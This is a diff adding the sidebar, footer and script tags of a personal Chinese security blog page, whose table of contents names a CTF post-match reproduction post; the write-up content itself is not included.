+    <div class="textwidget">
+        <p class="text-center">dddddddd</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="toc-text">长城杯线下赛赛后复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fancyapi"><span class="toc-text">fancyapi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#work"><span class="toc-text">work</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/codeql/">codeql</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">48</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/05/c3p0/"><i class="fa  fa-book"></i> C3P0</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/04/diary/"><i class="fa  fa-book"></i> 随便写写的日记</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/03/jep290/"><i class="fa  fa-book"></i> JEP290</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/04/28/%E4%BD%BF%E7%94%A8RASP%E5%AF%B9java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%BF%9B%E8%A1%8CWAF/"><i class="fa  fa-book"></i> RASP-waf命令执行</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/04/27/RASP%E5%AE%9E%E8%B7%B5/"><i class="fa  fa-book"></i> RASP实践</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
